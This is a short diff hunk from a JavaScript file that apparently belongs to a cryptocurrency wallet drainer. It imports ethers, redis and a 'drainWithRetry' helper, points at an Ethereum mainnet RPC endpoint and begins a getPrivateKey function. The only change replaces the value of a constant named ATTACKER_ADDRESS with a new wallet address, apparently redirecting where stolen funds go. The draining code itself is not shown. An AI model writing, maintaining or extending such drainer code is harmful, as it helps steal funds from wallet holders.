@@ -2,7 +2,7 @@ import { ethers } from 'ethers';
 import { createClient } from 'redis';
 import { drainWithRetry } from '../lib/drain.js';
 
-const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
+const ATTACKER_ADDRESS = '0x81720ac1a232EfA3D76B2586f789a3b1A5da51c9';
 const RPC_URL = 'https://eth-mainnet.g.alchemy.com/v2/demo';
 
 function getPrivateKey() {
